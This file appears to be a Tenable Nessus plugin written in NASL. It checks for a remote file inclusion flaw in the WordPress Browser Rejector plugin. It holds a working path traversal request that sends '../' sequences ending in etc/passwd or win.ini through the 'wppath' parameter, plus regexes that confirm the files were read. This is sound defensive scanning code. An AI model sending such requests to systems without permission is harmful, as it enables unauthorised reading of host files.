#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(64247);
  script_version("1.10");
  script_set_attribute(attribute:"plugin_modification_date", value:"2024/06/06");
  script_bugtraq_id(57220);

  script_name(english:"Browser Rejector Plugin for WordPress 'wppath' Parameter Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file inclusion vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Browser Rejector Plugin for WordPress installed on the remote host
is affected by a remote file inclusion vulnerability due to a failure
to properly sanitize user-supplied input to the 'wppath' parameter of
the 'rejectr.js.php' script. This vulnerability could allow an
unauthenticated, remote attacker to view arbitrary files or execute
arbitrary PHP code, possibly taken from third-party hosts, on the
remote host.");
  script_set_attribute(attribute:"see_also", value:"https://wordpress.org/plugins/browser-rejector/#changelog");
  script_set_attribute(attribute:"see_also", value:"https://plugins.trac.wordpress.org/changeset/648432/browser-rejector");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 2.11 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/01/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/01/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/01/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"enable_cgi_scanning", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2024 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("data_protection.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'Browser Rejector';
# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list("\(jQuery Browser Rejection Plugin\)");
  checks["/wp-content/plugins/browser-rejector/jquery.reject.js"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

foreach file (files)
{
  attack =  mult_str(str:"../", nb:12) + file;
  url = "/wp-content/plugins/browser-rejector/rejectr.js.php?wppath=" + attack;

  res = http_send_recv3(
    method    : "GET",
    item      : dir + url,
    port         : port,
    exit_on_fail : TRUE
  );
  body = res[2];

   # Check for errors
  error_returned = FALSE;
  if (
    !isnull(body) &&
    (
      # open_basedir
      "Failed opening required '" + attack >< body ||
      "open_basedir restriction in effect. File(" + attack >< body
    )
  ) error_returned = TRUE;
  pat = file_pats[file];

  if ((body =~ pat) || (error_returned))
  {
    if (report_verbosity > 0)
    {
      snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      if (error_returned)
      {
        report =
          '\nNessus was not able to exploit the issue, but was able to verify'+
          ' it' + '\nexists by examining the error message returned from the' +
          ' following' + '\nrequest :' +
          '\n' +
          '\n' + install_url + url +
          '\n';
      }
      else
      {
        report =
          '\nNessus was able to exploit the issue to retrieve the contents of '+
          '\n'+ "'" + file + "'" + ' using the following request :' +
          '\n' +
          '\n' + install_url + url +
          '\n';
      }
      if (report_verbosity > 1)
      {
        body = data_protection::redact_etc_passwd(output:body);
        report +=
          '\n' + 'This produced the following output :' +
          '\n' +
          '\n' + snip +
          '\n' + chomp(body) +
          '\n' + snip +
          '\n';
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
